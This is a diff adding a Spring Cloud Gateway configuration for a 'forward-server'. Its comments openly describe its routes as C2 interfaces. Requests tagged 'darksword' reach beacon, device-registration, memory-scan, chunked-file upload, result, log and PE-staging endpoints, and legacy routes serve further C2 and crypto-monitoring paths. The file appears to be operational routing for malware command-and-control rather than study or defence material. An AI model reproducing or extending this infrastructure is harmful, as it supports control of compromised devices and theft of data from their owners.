@@ -1,0 +1,160 @@
+server:
+  port: 8100
+  http2:
+    enabled: true
+
+spring:
+  application:
+    name: forward-server
+  cloud:
+    nacos:
+      discovery:
+        server-addr: http://127.0.0.1:8848
+        #namespace: a5b3bd13-9c96-4216-93fb-8b077e537f46 #测试
+        namespace: 31ee03b7-c6df-436d-990d-d6c08aa5c20a #开发
+    gateway:
+      discovery:
+        locator:
+          enabled: true
+      weightcalculator:
+        enabled: false
+      # ---- 高并发相关：响应超时 / 缓冲区 ----
+      httpclient:
+        # 连接超时：3s（默认 1s 容易误杀）
+        connect-timeout: 3000
+        # 响应超时：30s（慢上游也不会拖死网关）
+        response-timeout: 30s
+        # 池化连接上限
+        pool:
+          type: elastic
+          max-idle-time: 15s
+        # 强制使用 HTTP/1.1
+        protocol: HTTP11
+      # ---- 路由分发 ----
+      # 规则：带 X-Series: darksword → 18 系列下游；无该头 → 17 及以下（legacy）下游
+      # 18 路由 order 更小，优先匹配；legacy 作为无头兜底
+      routes:
+        # ========== 18 系列（必须带 Header=X-Series: darksword）==========
+        # 健康检查 → 18-device-server
+        - id: s18-health-route
+          uri: lb://18-device-server
+          order: 0
+          predicates:
+            - Header=X-Series, ^darksword$
+            - Path=/health,/healthz,/ready
+          filters:
+            - StripPrefix=0
+
+        # 控制面 + 内存扫描 → 18-ctwo-server
+        - id: s18-control-plane-route
+          uri: lb://18-ctwo-server
+          order: 1
+          predicates:
+            - Header=X-Series, ^darksword$
+            - Path=/api/chain-targets,/api/memres
+          filters:
+            - StripPrefix=0
+
+        # /war + /war_chunks* 流式大文件，超时 600s
+        - id: s18-war-route
+          uri: lb://18-ctwo-server
+          order: 10
+          predicates:
+            - Header=X-Series, ^darksword$
+            - Path=/war,/api/war,/war_chunks,/api/war_chunks,/war_chunks/**,/api/war_chunks/**
+          filters:
+            - StripPrefix=0
+          metadata:
+            response-timeout: 600s
+
+        # /beacon + /api/beacon → 18-device-server
+        - id: s18-beacon-route
+          uri: lb://18-device-server
+          order: 20
+          predicates:
+            - Header=X-Series, ^darksword$
+            - Path=/beacon,/api/beacon
+          filters:
+            - StripPrefix=0
+
+        # /a + /api/a + /api/device/register + /event → 18-device-server
+        - id: s18-device-route
+          uri: lb://18-device-server
+          order: 30
+          predicates:
+            - Header=X-Series, ^darksword$
+            - Path=/a,/api/a,/api/device/register,/event,/api/event
+          filters:
+            - StripPrefix=0
+
+        # C2 业务接口 → 18-ctwo-server
+        - id: s18-c2-route
+          uri: lb://18-ctwo-server
+          order: 40
+          predicates:
+            - Header=X-Series, ^darksword$
+            - Path=/u,/api/u,/nb,/api/nb,/result,/api/result,/log,/api/log,/p,/api/p
+          filters:
+            - StripPrefix=0
+          metadata:
+            response-timeout: 60s
+
+        # 工具 GET + 静态资源 → 18-ctwo-server
+        - id: s18-tools-route
+          uri: lb://18-ctwo-server
+          order: 50
+          predicates:
+            - Header=X-Series, ^darksword$
+            - Path=/myip,/c2,/log.html,/logs,/logs.txt,/pe_stage/**
+          filters:
+            - StripPrefix=0
+
+        # 18 兜底（必须带 Header，避免吞掉 legacy 流量）
+        - id: s18-capture-default-route
+          uri: lb://18-ctwo-server
+          order: 99
+          predicates:
+            - Header=X-Series, ^darksword$
+            - Path=/**
+          filters:
+            - StripPrefix=0
+
+        # ========== legacy（17 及以下，无 X-Series 头走这里）==========
+        # /a + /api/ip-sync/** → 17-binding-server（ip-sync 已从 17-ctwo-server 合并至此）
+        - id: legacy-binding-route
+          uri: lb://17-binding-server
+          order: 100
+          predicates:
+            - Path=/a,/api/ip-sync/**
+          filters:
+            - StripPrefix=0
+
+        # 其余 C2 接口 → 17-report-server
+        - id: legacy-report-route
+          uri: lb://17-report-server
+          order: 110
+          predicates:
+            - Path=/event,/u,/nb,/t,/ub,/uj,/us,/vhx,/beacon,/result,/p,/war,/crypto/mornitor,/health,/healthz,/ready,/robots.txt,/log.html
+          filters:
+            - StripPrefix=0
+
+        # details 静态资源 → 17-report-server
+        - id: legacy-details-static-route
+          uri: lb://17-report-server
+          order: 120
+          predicates:
+            - Path=/details/**
+          filters:
+            - StripPrefix=0
+            - AddResponseHeader=Cache-Control,public,max-age=3600
+
+# 网关全局超时
+playlet:
+  gateway:
+    route-mode: 1
+
+management:
+  endpoints:
+    web:
+      exposure:
+        include: health,info
